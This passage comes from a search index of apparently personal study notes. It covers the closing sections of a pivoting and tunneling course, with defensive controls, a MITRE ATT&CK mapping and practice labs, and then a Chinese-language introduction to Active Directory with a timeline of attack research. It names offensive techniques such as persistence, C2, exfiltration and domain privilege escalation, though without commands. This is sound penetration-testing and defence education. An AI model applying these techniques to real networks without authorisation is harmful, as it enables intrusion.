games. One game he downloaded and installed also installed malware that gave an attacker remote access to his laptop. When Nick goes into the office, he connects to the WiFi network that extends access to the employee network. Anyone can reach the Domain Controllers, File Shares, printers, and other important network resources from this network. Because there is malware on Nick's system, the attacker also has access to these network resources and can attempt to pivot across Inlanefreight's network due to Nick's bad security practices on his personal computer.</p> <p>Using <code>multi-factor authentication</code> (Something you have, something you know, something you are, location, etc.) are all excellent factors to consider when implementing authentication mechanisms. Implementing two or more factors for authentication (especially for administrative accounts and access) is a great way to make it more difficult for an attacker to gain full access to an account should a user's password or hash get compromised.</p> <p>Along with ensuring your users cannot cause harm, we should consider our policies and procedures for domain access and control. Larger organizations should also consider building a Security Operation Center (SOC) team or use a <code>SOC as a Service</code> to constantly monitor what is happening within the IT environment 24/7. Modern defensive technologies have come a long way and can help with many different defensive tactics, but we need human operators to ensure they function as they are supposed to. <code>Incident response</code> is something where we can't yet completely automate out the human element. So having a proper <code>incident response plan</code> ready is essential to be prepared for a breach.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#processes","title":"Processes","text":"<p>Maintaining and enforcing policies and procedures can significantly impact an organization's overall security posture. It is near impossible to hold an organization's employees accountable without defined policies. It makes it challenging to respond to an incident without defined and practiced procedures such as a <code>disaster recovery plan</code>. The items below can help to start defining an organization's <code>processes</code>, <code>policies</code>, and <code>procedures</code> relating to securing their users &amp; network environment.</p> <ul> <li>Proper policies and procedures for asset monitoring and management</li> <li>Host audits, the use of asset tags, and periodic asset inventories can help ensure hosts are not lost</li> <li>Access control policies (user account provisioning/de-provisioning), multi-factor authentication mechanisms</li> <li>Processes for provisioning and decommissioning hosts (i.e., baseline security hardening guideline, gold images)</li> <li>Change management processes to formally document <code>who did what</code> and <code>when they did it</code></li> </ul>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#technology","title":"Technology","text":"<p>Periodically check the network for legacy misconfigurations and new &amp; emerging threats. As changes are made to an environment, ensure that common misconfigurations are not introduced while paying attention to any vulnerabilities introduced by tools or applications utilized in the environment. If possible, attempt to patch or mitigate those risks with the understanding that the CIA triad is a balancing act, and the acceptance of the risk a vulnerability presents may be the best option for your environment.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#from-the-outside-moving-in","title":"From the Outside Moving In","text":"<p>When working with an organization to help them assess the security posture of their environment, it can be helpful to start from the outside and move our way in. As penetration testers and security practitioners, we want our clients to take our findings and recommendations seriously enough to inform their decisions moving forward. We want them to understand that the issues we uncover can also be found by individuals or groups with less honorable intentions. Let's consider this through a mental exercise using the outline below. Feel free to use these burning questions and considerations to start a conversation with friends, team-members or if you are alone, take some notes and come up with the most secure design you can think of:</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#perimeter-first","title":"Perimeter First","text":"<ul> <li><code>What exactly are we protecting?</code></li> <li><code>What are the most valuable assets the organization owns that need securing?</code></li> <li><code>What can be considered the perimeter of our network?</code></li> <li><code>What devices &amp; services can be accessed from the Internet? (Public-facing)</code></li> <li><code>How can we detect &amp; prevent when an attacker is attempting an attack?</code></li> <li><code>How can we make sure the right person &amp;/or team receives alerts as soon as something isn't right?</code></li> <li><code>Who on our team is responsible for monitoring alerts and any actions our technical controls flag as potentially malicious?</code></li> <li><code>Do we have any external trusts with outside partners?</code></li> <li><code>What types of authentication mechanisms are we using?</code></li> <li><code>Do we require Out-of-Band (OOB) management for our infrastructure. If so, who has access permissions?</code></li> <li><code>Do we have a Disaster Recovery plan?</code></li> </ul> <p>When considering these questions regarding the perimeter, we may face the reality that an organization has infrastructure that could be based on premises &amp;/or in the cloud. Most organizations in the modern day operate hybrid-cloud infrastructures. This means some of the technologies used by organizations may be running on network &amp; server infrastructure owned by the organization, and some may be hosted by a 3rd party cloud provider (AWS, Azure, GCP, etc.).</p> <ul> <li>External interface on a firewall</li> <li>Next-Gen Firewall Capabilities<ul> <li>Blocking suspicious connections by IP</li> <li>Ensuring only approved individuals are connecting to VPNs</li> <li>Building the ability to quick disconnect suspicious connections without disrupting business functions</li> </ul> </li> </ul>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#internal-considerations","title":"Internal Considerations","text":"<p>Many of the questions we ask for external considerations apply to our internal environment. There are a few differences; however, there are many different routes for ensuring the successful defense of our networks. Let's consider the following:</p> <ul> <li><code>Are any hosts that require exposure to the internet properly hardened and placed in a DMZ network?</code></li> <li><code>Are we using Intrusion Detection and Prevention systems within our environment?</code></li> <li><code>How are our networks configured? Are different teams confined to their own network segments?</code></li> <li><code>Do we have separate networks for production and management networks?</code></li> <li><code>How are we tracking approved employees who have remote access to admin/management networks?</code></li> <li><code>How are we correlating the data we are receiving from our infrastructure defenses and end-points?</code></li> <li><code>Are we utilizing host-based IDS, IPS, and event logs?</code></li> </ul> <p>Our best chance of spotting, stopping, and potentially even preventing an attack often depends on our ability to maintain visibility within our environment. A proper SIEM implementation to correlate and analyze our host and infrastructure logs can go a long way. Combine that with adequate network segmentation, and it becomes infinitely more challenging for an attacker to gain a foothold and pivot to targets. Simple things like ensuring Steve from HR cannot view or access network infrastructure such as switches and routers or admin panels for internal websites can prevent the use of standard users for lateral movement.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#mitre-breakdown","title":"MITRE Breakdown","text":"<p>As a different look at this, we have broken down the major actions we practice in this module and mapped controls based on the TTP and a MITRE tag. Each tag corresponds with a section of the Enterprise ATT&amp;CK Matrix found here. Any tag marked as <code>TA</code> corresponds to an overarching tactic, while a tag marked as <code>T###</code> is a technique found in the matrix under tactics.</p> TTP MITRE Tag Description <code>External Remote Services</code> T1133 We have options for prevention when dealing with the use of External Remote Services. <code>First</code>, having a proper firewall in place to segment our environment from the rest of the Internet and control the flow of traffic is a must. <code>Second</code>, disabling and blocking any internal traffic protocols from reaching out to the world is always a good practice. <code>Third</code>, using a VPN or some other mechanism that requires a host to be <code>logically</code> located within the network before it gains access to those services is a great way to ensure you aren't leaking data you shouldn't. <code>Remote Services</code> T1021 Multi-factor authentication can go a long way when trying to mitigate the unauthorized use of remote services such as SSH and RDP. Even if a user's password was taken, the attacker would still need a way to acquire the string from their MFA of choice. Limiting user accounts with remote access permissions and separating duties as to who can remotely access what portions of a network can go a long way. Utilizing your networked firewall and the built-in firewall on your hosts to limit incoming/outgoing connections for remote services is an easy win for defenders. It will stop the connection attempt unless it is from an authorized internal or external network. When dealing with infrastructure devices such as routers and switches, only exposing remote management services and ports to an Out Of Band (OOB network is a best practice that should always be followed. Doing this ensures that anyone who may have compromised the enterprise networks cannot simply hop from a regular user's host into the infrastructure. <code>Use of Non-Standard Ports</code> T1571 This technique can be a tricky one to catch. Attackers will often use a common protocol such as <code>HTTP</code> or <code>HTTPS</code> to communicate with your environment. It is hard to see what is going on, especially with the use of HTTPS, but the pairings of protocols such as these with a non-standard port ( 44<code>4</code> instead of 44<code>3</code>, for example) can tip us off to something suspicious happening. Attackers will often try to work in this manner, so having a solid <code>baseline</code> of what ports/protocols are commonly used in your environment can go a long way when trying to spot the bad. Using some form of a Network Intrusion Prevention or Detection system can also help spot and shut down the potentially malicious traffic. <code>Protocol Tunneling</code> T1572 This is an interesting problem to tackle. Many actors utilize protocol tunneling to hide their communications channels. Often we will see things much like we practiced in this module (tunneling other traffic through an SSH tunnel) and even the use of protocols like DNS to pass instructions from external sources to a host internal to the network. Taking the time to lock down what ports and protocols are allowed to talk in/out of your networks is a must. If you have a domain running and are hosting a DC &amp; DNS server, your hosts should have no reason to reach externally for name resolution. Disallowing DNS resolution from the web (except to specific hosts like the DNS server) can help with an issue such as this. Having a good monitoring solution in place can also watch for traffic patterns and what is known as <code>Beaconing</code>. Even if the traffic is encrypted, we may possibly see requests happening in a pattern over time. This is a common trait of a C2 channel. <code>Proxy Use</code> T1090 The use of a Proxy point is commonplace among threat actors. Many will use a proxy point or distribute their traffic over multiple hosts so that they do not directly expose their infrastructure. By using a proxy, there is no direct connection from the victim's environment to the attacker's host at any given time. The detection and prevention of proxy use is a bit difficult as it takes an intimate knowledge of common net flow within your environment. The most effective route is maintaining a list of allowed/blocked domains and IP addresses. Anything not explicitly allowed will be blocked until you let the traffic through. <code>LOTL</code> N/A It can be hard to spot an attacker while they are utilizing the resources on hand. This is where having a baseline of network traffic and user behavior comes in handy. If your defenders understand what the day-to-day normal for their network looks like, you have a chance to spot the abnormal. Watching for command shells and utilizing a properly configured EDR and AV solution will go a long way to providing you visibility. Having some form of networking monitoring and logging feeding into a common system like a SIEM which defenders check, will go a long way to seeing an attack in the initial stages instead of after the fact."},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#beyond-this-module","title":"Beyond this Module","text":""},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#real-world","title":"Real World","text":"<p>As a Penetration Tester, one could expect the tasks undertaken in this module to be everyday tasks assigned to us during our day-to-day duties. Sometimes under direct guidance and supervision, sometimes not depending on our skill level. Having a deep understanding of <code>Pivoting</code>, <code>Tunneling</code>, <code>Port Forwarding</code>, <code>Lateral Movement</code> and the <code>tools/techniques</code> needed to perform these actions is essential for accomplishing our mission. Our actions can and probably will often influence the actions of our teammates and more senior testers since they may be basing their next steps on our results if we are working jointly on an assessment.</p> <p>Those actions could include:</p> <ul> <li>Utilizing tunnels and pivot points we set up to perform additional <code>exploitation</code> and <code>lateral movement</code>.</li> <li>Implanting <code>persistence</code> mechanisms in each subnet to ensure continued access.</li> <li><code>Command &amp; Control</code> inside and throughout enterprise environments.</li> <li>Utilizing our tunnels for <code>security control bypass</code> when bringing tools in and exfiltrating data.</li> </ul> <p>Having a firm grasp of networking concepts and how pivoting and tunneling functions is a core skill for any pentester or defender. If any of the concepts, terminology, or actions discussed in this module were a bit challenging or confusing, consider going back and checking out the Introduction to Networking module. It provides us with a solid foundation in Networking concepts such as subnetting, layer 2-3 technologies, tools, and common addressing mechanisms.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#whats-next","title":"What's Next?","text":"<p>To better understand Active Directory and how to use our new skills in enterprise pentesting, check out the Introduction to Active Directory and Active Directory Enumeration and Attacks module. The Shells and Payloads module can help us improve our exploitation skills and give us better insight into the payloads we create and use in a target network. If the webserver shells and pivots portions in this module were difficult, checking out the Introduction to Web Applications and File Upload Attacks modules can clarify those topics for us. Don't discount the fantastic challenge that Starting Point is. These can be great ways to practice applying the skills you learn in this module and other modules on Academy to challenges on Hack The Box's main platform.</p> <p></p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#pivoting-tunneling-into-other-learning-opportunities","title":"Pivoting &amp; Tunneling Into Other Learning Opportunities","text":"<p>The Hack The Box main platform has many targets for learning and practicing the skills learned in this module. The Containers and Pivoting track can provide you with a real challenge to put your pivoting skills to the test. <code>Tracks</code> are curated lists of machines and challenges for users to work through and master a particular topic. Each track contains boxes of varying difficulties with various attack vectors. Even if you cannot solve these boxes on your own, it is still worth working with them with a walkthrough or video or just watching a video on the box by Ippsec. The more you expose yourself to these topics, the more comfortable you will become. The boxes below are great for practicing the skills learned in this module.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#boxes-to-pwn","title":"Boxes To Pwn","text":"<ul> <li>Enterprise IPPSec Walkthrough</li> <li>Inception IPPSec Walkthrough</li> <li>Reddish IPPSec Walkthroguh This host is quite a challenge.</li> </ul> <p>Ippsec has recorded videos explaining the paths through many of these boxes. As a resource, Ippsec's site is a great resource to search for videos and write-ups pertaining to many different subjects. Check out his videos and write-ups if you get stuck or want a great primer dealing with Active Directory and wish to see how some of the tools work.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#prolabs","title":"ProLabs","text":"<p><code>Pro Labs</code> are large simulated corporate networks that teach skills applicable to real-life penetration testing engagements. The <code>Dante</code> Pro Lab is an excellent place to practice chaining our pivoting skills together with other enterprise attack knowledge. The <code>Offshore</code> and <code>RastaLabs</code> Pro Labs are intermediate-level labs that contain a wealth of opportunities for practicing pivoting through networks.</p> <ul> <li>RastaLabs Pro Lab</li> <li>Dante Pro Lab</li> <li>Offshore Pro Lab</li> </ul> <p>Head HERE to check out all the Pro Labs that HTB has to offer.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#endgames","title":"Endgames","text":"<p>For an extreme challenge that may take you a while to get through, check out the Ascension Endgames. This endgame features two different AD domains and has plenty of chances to practice our AD enumeration and attacking skills.</p> <p></p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#writerseducational-creators-and-blogs-to-follow","title":"Writers/Educational Creators and Blogs To Follow","text":"<p>Between the HTB <code>Discord</code>, <code>Forums</code>, and <code>blogs</code>, there are plenty of outstanding write-ups to help advance your skills along the way. One to pay attention to would be 0xdf's walkthroughs. His blog is a great resource to help us understand how the tools, tactics, and concepts we are learning tie together into a holistic attack path. The list below contains links to other authors and blogs we feel do a great job discussing Information Security topics.</p> <p>RastaMouse writes excellent content on Red-Teaming, C2 infrastructure, pivoting, payloads, etc. (He even made a Pro Lab to showcase those things!)</p> <p>SpecterOps has written a great post covering SSH Tunneling and the use of proxies over a multitude of protocols. It's a must-read for anyone looking to know more about the subject and would make a handy resource to have during an engagement.</p> <p>The HTB Blog is, of course, a great place to read up on current threats, how-to's for popular TTPs, and more.</p> <p>SANS puts out plenty of great infosec related information and webcasts like the one linked here are a great example of that. This will cover many different Pivoting tools and avenues of use.</p> <p>Plaintext's Pivoting Workshop is an incredible workshop that our very own Academy Training Developer, Plaintext, put together to help prepare players for Cyber Apocalypse CTF 2022. The workshop is delivered in an engaging &amp; entertaining manner, and viewers will benefit from it for years to come. Check it out if you get the chance.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#closing-thoughts","title":"Closing Thoughts","text":"<p>Congratulations on completing this module, and we at HTB know you have learned some new skills to use during your journey into the world of Cyber Security. <code>Pivoting, Tunneling, and Port Forwarding</code> are foundational concepts that should be in every pentesters toolbox.</p> <p>As a defender, knowing how to spot when a host is compromised and being used as a pivot point or if traffic is being tunneled through a non-standard route is crucial. Keep practicing and leveling up your skillset. Happy Hacking!</p>"},{"location":"%E5%9F%BA%E7%A1%80/Active%20Directory%20%E7%AE%80%E4%BB%8B/","title":"Active Directory \u7b80\u4ecb","text":""},{"location":"%E5%9F%BA%E7%A1%80/Active%20Directory%20%E7%AE%80%E4%BB%8B/#active-directory","title":"\u4e3a\u4ec0\u4e48\u9009\u62e9 Active Directory","text":"<p>\u9002\u7528\u4e8e Windows \u7f51\u7edc\u73af\u5883\u7684\u76ee\u5f55\u670d\u52a1\u3002\u5206\u5e03\u5f0f\u5206\u5c42\u7ed3\u6784\uff0c\u5141\u8bb8\u96c6\u4e2d\u7ba1\u7406\u7ec4\u7ec7\u7684\u8d44\u6e90\uff1a\u7528\u6237\u3001\u8ba1\u7b97\u673a\u3001\u7ec4\u3001\u7f51\u7edc\u8bbe\u5907\u3001\u6587\u4ef6\u5171\u4eab\u3001\u7ec4\u7b56\u7565\u3001\u8bbe\u5907\u548c\u4fe1\u4efb\u3002 \u5728 Windows\u57df\u73af\u5883 \u4e2d\u63d0\u4f9b \u8eab\u4efd\u9a8c\u8bc1(authentication) \u548c \u6388\u6743\u529f\u80fd(authorization)</p> <p>\u8bbe\u8ba1\u4e3a\u5411\u540e\u517c\u5bb9\uff0c\u8bb8\u591a\u529f\u80fd \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0d\u5b89\u5168 \u5e76\u4e14\u5bb9\u6613\u51fa\u73b0\u9519\u8bef\u914d\u7f6e \u53ef\u5229\u7528\u6b64\u5f31\u70b9 \u7eb5\u6a2a\u79fb\u52a8 \u5e76\u83b7\u5f97\u672a\u6388\u6743\u8bbf\u95ee \u8fd1\u5e74\u6765 \u53d7\u5230\u8d8a\u6765\u8d8a\u591a\u7684\u653b\u51fb</p> <p>\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u76f8\u5f53\u5927\u7684\u53ea\u8bfb\u6570\u636e\u5e93\uff0c\u57df\u5185\u7684\u7528\u6237\u90fd\u53ef\u4ee5\u8bbf\u95ee  \u666e\u901a AD\u8d26\u53f7 \u5747\u53ef\u7528\u4e8e\u679a\u4e3e\u57df\u5e76\u5f7b\u5e95\u5bfb\u627e\u9519\u8bef\u914d\u7f6e\u548c\u7f3a\u9677</p> <p>\u57fa\u4e8e\u4ee5\u4e0a \u7eb5\u6df1\u9632\u5fa1\u7b56\u7565\u548c\u4ed4\u7ec6\u89c4\u5212\u5f88\u91cd\u8981 \u5173\u6ce8\u5b89\u5168\u548c\u52a0\u56fa \u7f51\u7edc\u5206\u6bb5 \u6700\u5c0f\u6743\u9650 </p> <p>\u653b\u51fb\u793a\u4f8b</p> <p>Active Directory \u4f7f\u7ba1\u7406\u5458\u548c\u7528\u6237\u53ef\u4ee5\u8f7b\u677e\u67e5\u627e\u548c\u4f7f\u7528\u4fe1\u606f\uff0c\u5177\u6709\u9ad8\u5ea6\u53ef\u6269\u5c55\u6027\uff0c\u6bcf\u4e2a\u57df\u652f\u6301\u6570\u767e\u4e07\u4e2a\u5bf9\u8c61\uff0c\u5e76\u5141\u8bb8\u968f\u7740\u7ec4\u7ec7\u7684\u53d1\u5c55\u521b\u5efa\u989d\u5916\u7684\u57df ![[Active Directory Organization(\u7ec4\u7ec7).png]] \u4e86\u89e3 Active Directory \u7684\u7ed3\u6784\u548c\u529f\u80fd \u624d\u80fd\u66f4\u597d\u7684\u4e86\u89e3\u4f5c\u4e3a\u653b\u51fb\u8005\u548c\u9632\u5fa1\u8005\u7684\u4fe1\u606f</p> <p>\u52d2\u7d22\u8f6f\u4ef6\u5c06 Active Directory \u4f5c\u4e3a\u653b\u51fb\u8def\u5f84\u7684\u5173\u952e\u90e8\u5206 \u4f8b\u5982 PrintNightmare (CVE-2021-34527)\u548cZerologon (CVE-2020-1472)</p> <pre><code>\u4e3a\u679a\u4e3e\u548c\u653b\u51fb Active Directory \u5960\u5b9a\u57fa\u7840\uff0c\u6df1\u5165\u4ecb\u7ecd AD \u7684\u7ed3\u6784\u548c\u529f\u80fd\uff0c\u8ba8\u8bba\u5404\u79cd AD \u5bf9\u8c61\uff0c\u7528\u4e8e\u7ba1\u7406 AD \u7684user rights and privileges, \u5de5\u5177\uff0c\u6d41\u7a0b\u3002\n</code></pre>"},{"location":"%E5%9F%BA%E7%A1%80/Active%20Directory%20%E7%AE%80%E4%BB%8B/#_1","title":"\u5386\u53f2","text":"<p>LDAP \u662f Active Directory \u7684\u57fa\u7840\uff0cActive Directory \u7684\u7b2c\u4e00\u4e2a beta \u7248\u672c\u662f\u5728 1997 \u5e74\u3002 Windows Server 2003 \u6dfb\u52a0\u4e86Forest\u529f\u80fd Windows Server 2008 \u6dfb\u52a0\u4e86Active Directory \u8054\u5408\u670d\u52a1 (ADFS) Windows Server 2016 \u8fc1\u79fb\u5230\u4e91\u3001\u5b89\u5168\u589e\u5f3a\u529f\u80fd\u3001\u4f8b\u5982\u7528\u6237\u8bbf\u95ee\u76d1\u63a7\u548c\u7ec4\u7ba1\u7406\u670d\u52a1\u5e10\u6237 (gMSA) \u8fd0\u884c Active Directory \u7684\u7ec4\u7ec7\u9700\u8981\u59cb\u7ec8\u638c\u63e1\u4fee\u8865\u548c\u5b9e\u65bd\u4fee\u590d\u7684\u80fd\u529b\u3002\u4f5c\u4e3a\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\uff0c\u6211\u4eec\u7684\u4efb\u52a1\u662f\u5728\u653b\u51fb\u8005\u4e4b\u524d\u4e3a\u6211\u4eec\u7684\u5ba2\u6237\u53d1\u73b0\u8fd9\u4e9b\u6f0f\u6d1e\u3002</p>"},{"location":"%E5%9F%BA%E7%A1%80/Active%20Directory%20%E7%AE%80%E4%BB%8B/#active-directory_1","title":"\u591a\u5e74\u6765\u7684 Active Directory \u7814\u7a76","text":"<p>\u8fc7\u53bb\u5341\u5e74\uff0cActive Directory \u4e00\u76f4\u662f\u5b89\u5168\u7814\u7a76\u4eba\u5458\u5173\u6ce8\u7684\u4e3b\u8981\u9886\u57df \u4ece\u8bb8\u591a\u5de5\u5177\u548c\u5927\u91cf\u7814\u7a76 \u53d1\u73b0\u4eca\u5929\u4ecd\u5728\u4f7f\u7528\u7684\u5e38\u89c1\u653b\u51fb\u548c\u6280\u672f \u65f6\u95f4\u8868 \u6700\u91cd\u8981\u7684\u7814\u7a76\u548c\u5de5\u5177 2021  PrintNightmare\u6f0f\u6d1e\u53d1\u5e03 Windows Print Spooler \u4e2d\u7684\u4e00\u4e2a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7f3a\u9677\uff0c\u53ef\u7528\u4e8e\u63a5\u7ba1AD\u73af\u5883\u4e2d\u7684\u4e3b\u673a\u3002 Shadow Credentials\u653b\u51fb\u53d1\u5e03 \u5141\u8bb8\u4f4e\u6743\u9650\u7528\u6237\u5728\u5408\u9002\u6761\u4ef6\u4e0b\u5192\u5145\u5176\u4ed6\u7528\u6237\u548c\u8ba1\u7b97\u673a\u8d26\u6237\uff0c\u5e76\u53ef\u63d0\u5347\u57df\u4e2d\u7684\u6743\u9650 noPac\u653b\u51fb\u53d1\u5e03 \u5b58\u5728\u5229\u7528\u6761\u4ef6\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u4ece\u6807\u51c6\u57df\u7528\u6237\u8d26\u6237\u83b7\u5f97\u5bf9\u57df\u7684\u5b8c\u5168\u63a7\u5236</p> <p>2020 ZeroLogon \u5141\u8bb8\u5192\u5145\u7f51\u7edc\u4e2d\u4efb\u4f55\u672a\u4fee\u8865\u7684\u57df\u63a7\u5236\u5668</p> <p>2019 harmj0y \u5728 DerbyCon \u4e0a\u53d1\u8868\u4e86\u201cKerberoasting Revisited\u201d\u7684\u6f14\u8bb2\uff0c\u9610\u8ff0\u4e86 Kerberoasting \u7684\u65b0\u65b9\u6cd5\u3002Elad Shamir \u53d1\u5e03\u4e86\u4e00\u7bc7\u535a\u6587\uff0c\u6982\u8ff0\u4e86\u5728 Active Directory \u4e2d\u6ee5\u7528\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u59d4\u6d3e (RBCD) \u7684\u6280\u672f\u3002BC Security \u516c\u53f8\u53d1\u5e03\u4e86Empire 3.0\uff08\u73b0\u4e3a\u7b2c 4 \u7248\uff09\uff0c\u5b83\u662f\u7528 Python3 \u7f16\u5199\u7684 PowerShell Empire \u6846\u67b6\u7684\u91cd\u65b0\u53d1\u5e03\uff0c\u5e76\u8fdb\u884c\u4e86\u8bb8\u591a\u6dfb\u52a0\u548c\u66f4\u6539\u3002</p> <p>2018 Lee Christensen \u53d1\u73b0\u4e86\u201c\u6253\u5370\u673a\u9519\u8bef\u201d\u9519\u8bef\uff0c\u5e76\u53d1\u5e03\u4e86SpoolSample\u00a0PoC \u5de5\u5177\uff0c\u8be5\u5de5\u5177\u5229\u7528\u6b64\u9519\u8bef\u5f3a\u5236 Windows \u4e3b\u673a\u901a\u8fc7 MS-RPRN RPC \u63a5\u53e3\u5bf9\u5176\u4ed6\u673a\u5668\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002harmj0y \u53d1\u5e03\u4e86\u7528\u4e8e\u653b\u51fb Kerberos\u7684Rubeus \u5de5\u5177\u5305\u30022018 \u5e74\u672b\uff0charmj0y \u8fd8\u53d1\u5e03\u4e86\u535a\u5ba2\u201cNot A Security Boundary: Breaking Forest Trusts\u201d\uff0c\u5176\u4e2d\u4ecb\u7ecd\u4e86\u6709\u5173\u8de8\u68ee\u6797\u4fe1\u4efb\u6267\u884c\u653b\u51fb\u7684\u5173\u952e\u7814\u7a76\u3002DCShadow\u653b\u51fb\u6280\u672f\u4e5f\u662f\u7531 Vincent LE TOUX \u548c Benjamin Delpy \u5728 Bluehat IL 2018 \u5927\u4f1a\u4e0a\u53d1\u5e03\u7684\u3002\u5e73\u57ce\u5821\u8be5\u5de5\u5177\u7531 Vincent LE TOUX \u53d1\u5e03\uff0c\u7528\u4e8e\u901a\u8fc7\u67e5\u627e\u9519\u8bef\u914d\u7f6e\u548c\u5176\u4ed6\u53ef\u80fd\u63d0\u9ad8\u57df\u98ce\u9669\u7ea7\u522b\u7684\u7f3a\u9677\u5e76\u751f\u6210\u53ef\u7528\u4e8e\u786e\u5b9a\u8fdb\u4e00\u6b65\u5f3a\u5316\u73af\u5883\u7684\u65b9\u6cd5\u7684\u62a5\u544a\u6765\u6267\u884c Active Directory \u7684\u5b89\u5168\u5ba1\u8ba1\u3002</p> <p>2017 \u5f15\u5165\u4e86ASREPRoast\u6280\u672f\u6765\u653b\u51fb\u4e0d\u9700\u8981 Kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u5e10\u6237\u3002_wald0 \u548charmj0y\u5728 Black Hat \u548c DEF CON\u4e0a\u53d1\u8868\u4e86\u5173\u4e8e Active Directory ACL \u653b\u51fb\u201cACE Up the Sleeve\u201d\u7684\u5173\u952e\u6f14\u8bb2\u3002harmj0y \u53d1\u5e03\u4e86\u5173\u4e8e\u679a\u4e3e\u548c\u653b\u51fb\u57df\u4fe1\u4efb\u7684\u201c\u653b\u51fb\u57df\u4fe1\u4efb\u6307\u5357\u201d\u535a\u5ba2\u6587\u7ae0\u3002</p> <p>2016 BloodHound\u4f5c\u4e3a\u4e00\u79cd\u6539\u53d8\u6e38\u620f\u89c4\u5219\u7684\u5de5\u5177\u53d1\u5e03\uff0c\u7528\u4e8e\u5728DEF CON 24\u4e0a\u53ef\u89c6\u5316 AD \u4e2d\u7684\u653b\u51fb\u8def\u5f84\u3002</p> <p>2015 2015 \u5e74\u53d1\u5e03\u4e86\u4e00\u4e9b\u6709\u53f2\u4ee5\u6765\u6700\u5177\u5f71\u54cd\u529b\u7684 Active Directory \u5de5\u5177\u3002PowerShell Empire \u6846\u67b6\u5df2\u53d1\u5e03\u3002PowerView 2.0\u4f5c\u4e3a\uff08\u73b0\u5df2\u5f03\u7528\uff09PowerTools\u5b58\u50a8\u5e93\u7684\u4e00\u90e8\u5206\u53d1\u5e03\uff0c\u8be5\u5b58\u50a8\u5e93\u662f PowerShellEmpire GitHub 